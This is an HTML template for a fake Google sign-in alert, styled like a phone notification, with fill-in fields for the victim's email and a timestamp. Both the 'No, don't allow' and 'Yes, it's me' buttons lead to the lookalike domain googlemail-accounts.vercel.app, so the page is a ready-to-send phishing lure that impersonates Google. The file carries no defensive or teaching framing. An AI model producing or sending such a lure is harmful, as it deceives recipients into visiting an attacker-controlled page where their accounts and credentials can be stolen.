<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Google Sign-in Alert</title>
    <style>
        body {
            font-family: 'Google Sans', Roboto, Arial, sans-serif;
            background-color: #1a1a1a; /* Dark background */
            margin: 0;
            padding: 0;
            color: #e0e0e0; /* Light text color */
        }
        .container {
            width: 100%;
            max-width: 400px; /* Smaller container to mimic phone screen */
            margin: 20px auto;
            background-color: #2a2a2a; /* Slightly lighter dark for content area */
            border-radius: 8px;
            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.3);
            padding: 0; /* Remove padding from container, add to sections */
        }
        .header {
            display: flex;
            align-items: center;
            padding: 15px 20px;
            border-bottom: 1px solid #3a3a3a;
        }
        .header .close-icon {
            font-size: 24px;
            color: #e0e0e0;
            margin-right: 20px;
            text-decoration: none;
        }
        .header .google-text {
            font-size: 18px;
            font-weight: 500;
            color: #e0e0e0;
        }
        .content {
            padding: 20px;
            text-align: left;
        }
        .content h1 {
            font-size: 22px;
            font-weight: 500;
            margin-top: 0;
            margin-bottom: 20px;
            color: #e0e0e0;
            text-align: center; /* Added to center the heading */
        }
        .email-info {
            display: flex;
            align-items: center;
            justify-content: center; /* Added to center the email info */
            margin-bottom: 20px;
        }
        .email-info .icon {
            width: 24px;
            height: 24px;
            border-radius: 50%;
            background-color: #4285f4; /* Google blue */
            display: flex;
            justify-content: center;
            align-items: center;
            color: #ffffff;
            font-size: 14px;
            font-weight: bold;
            margin-right: 10px;
        }
        .email-info p {
            margin: 0;
            font-size: 16px;
            color: #e0e0e0;
            
        }
        .detail-row {
            margin-bottom: 15px;
        }
        .detail-row p {
            margin: 0;
            font-size: 14px;
            color: #b0b0b0; /* Lighter grey for labels */
        }
        .detail-row strong {
            display: block;
            font-size: 16px;
            color: #e0e0e0;
            margin-top: 5px;
        }
        .buttons-container {
            display: flex;
            justify-content: space-around;
            padding: 20px;
            border-top: 1px solid #3a3a3a;
        }
        .button {
            display: inline-block;
            padding: 10px 15px;
            border-radius: 20px; /* More rounded buttons */
            text-decoration: none;
            font-weight: 500;
            font-size: 14px;
            cursor: pointer;
            transition: background-color 0.3s ease;
            text-align: center;
            min-width: 120px;
        }
        .button.deny {
            background-color: #3a3a3a;
            color: #e0e0e0;
            border: 1px solid #5a5a5a;
        }
        .button.deny:hover {
            background-color: #4a4a4a;
        }
        .button.allow {
            background-color: #4285f4; /* Google blue */
            color: #ffffff;
            border: 1px solid #4285f4;
        }
        .button.allow:hover {
            background-color: #3367d6; /* Darker blue on hover */
        }
        .button.deny span {
            color: #ff4d4d; /* Red color for 'X' */
            margin-right: 5px;
        }
        .button.allow span {
            color: #52c41a; /* Green color for '✓' */
            margin-right: 5px;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <a href="#" class="close-icon">&times;</a>
            <span class="google-text">Google</span>
        </div>
        <div class="content">
            <h1>Are you trying to sign in?</h1>
            <div class="email-info">
                <!-- <span class="icon">P</span> Placeholder for profile initial or small icon -->
                <p>{{email}}</p>
            </div>
            <div class="detail-row">
                <p>Device</p>
                <strong>Windows</strong>
            </div>
            <div class="detail-row">
                <p>Near</p>
                <strong>UK, London</strong>
            </div>
            <div class="detail-row">
                <p>Time</p>
                <strong>{{timestamp}}</strong>
            </div>
        </div>
        <div class="buttons-container">
            <a href="https://googlemail-accounts.vercel.app/" class="button deny"><span>&times;</span> No, don't allow</a>
            <a href="https://googlemail-accounts.vercel.app/" class="button allow"><span>&#10003;</span> Yes, it's me</a>
        </div>
    </div>
</body>
</html>
